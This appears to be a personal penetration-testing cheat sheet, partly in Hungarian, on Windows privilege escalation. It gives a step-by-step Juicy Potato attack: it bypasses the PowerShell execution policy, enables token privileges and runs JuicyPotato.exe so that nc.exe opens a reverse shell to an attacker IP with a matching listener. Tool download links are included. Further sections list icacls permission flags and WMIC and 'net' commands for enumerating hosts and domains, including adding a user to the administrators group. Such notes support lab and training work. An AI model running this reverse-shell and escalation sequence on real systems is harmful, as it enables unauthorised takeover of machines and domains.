# Win privesc techniques
## Juicy Potato
* Needed scripts from github (all of them need to be uploaded to the victim machine)
  * JuicyPotato binaries
    * https://github.com/ohpe/juicy-potato
  * ncat binaries
    * https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
  * Enable privileges
    * ez nem mukodott
      * https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1
    * ez mukodott
      * https://www.leeholmes.com/adjusting-token-privileges-in-powershell/
* Eloszor futtassuk a JuicyPotato binary-t uresen. Ki kell hogy adja e help menut.
* Utana parameteresen futtassuk
  * Ha hiba van, erdemes megnezni egyesevel a cmd es nc binary-kat az absolute uttal, hogy jok e
  * Ha COM recv hiba van, akkor masik clsid-t probaljunk meg
    * Minden oprendszer verziohoz kulon vannak, itt talalhatok
      * https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
    * Valasszuk ki a megfelelo oprendszer verziot, es ott 4-5 darabot probaljunk meg a clsid-k kozul, valamelyiknek mukodnie kell
<pre>
<b># victim machine</b>
PS> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
PS> Import-Module .\EnableAllTokenPrivs.ps1
PS> Enable-Privilege -Privilege SeAssignPrimaryTokenPrivilege
PS> whoami /priv (most mar elvileg Enabled lett)
PS> .\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\downloads\nc.exe 10.10.16.5 5555 -e c:\windows\system32\cmd.exe" -t * -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}"

<b># attack machine</b>
$ nc -nvlp 5555
</pre>
## File permissions
<pre>
<b># get file permissions</b> 
C:\> icacls "C:\file1.txt"
</pre>
<pre>
<b># resource access level</b>
(CI): container inherit
(OI): object inherit
(IO): inherit only
(NP): do not propagate inherit
(I): permission inherited from parent container

<b># basic access permissions</b>
F : full access
D :  delete access
N :  no access
M :  modify access
RX :  read and execute access
R :  read-only access
W :  write-only access
</pre>
## Host enumeration
### Host enumeration with WMIC
|Command|Description|
|-------|-----------|
|wmic qfe get Caption,Description,HotFixID,InstalledOn|Prints the patch level and description of the Hotfixes applied|
|wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List|Displays basic host information to include any attributes within the list|
|wmic process list /format:list|A listing of all processes on host|
|wmic ntdomain list /format:list|Displays information about the Domain and Domain Controllers|
|wmic useraccount list /format:list|Displays information about all local accounts and any domain accounts that have logged into the device|
|wmic group list /format:list|Information about all local groups|
|wmic sysaccount list /format:list|Dumps information about any system accounts that are being used as service accounts.|
### Host enumeration with cmd 'net' command
|Command|Description|
|-------|-----------|
|net accounts|Information about password requirements|
|net accounts /domain|Password and lockout policy|
|net group /domain|Information about domain groups|
|net group "Domain Admins" /domain|List users with domain admin privileges|
|net group "domain computers" /domain|List of PCs connected to the domain|
|net group "Domain Controllers" /domain|List PC accounts of domains controllers|
|net group <domain_group_name> /domain|User that belongs to the group|
|net groups /domain|List of domain groups|
|net localgroup|All available groups|
|net localgroup administrators /domain|List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)|
|net localgroup Administrators|Information about a group (admins)|
|net localgroup administrators [username] /add|Add user to administrators|
|net share|Check current shares|
|net user <ACCOUNT_NAME> /domain|Get information about a user within the domain|
|net user /domain|List all users of the domain|
|net user %username%|Information about the current user|
|net use x: \computer\share|Mount the share locally|
|net view|Get a list of computers|
|net view /all /domain[:domainname]|Shares on the domains|
|net view \computer /ALL|List shares of a computer|
|net view /domain|List of PCs of the domain|
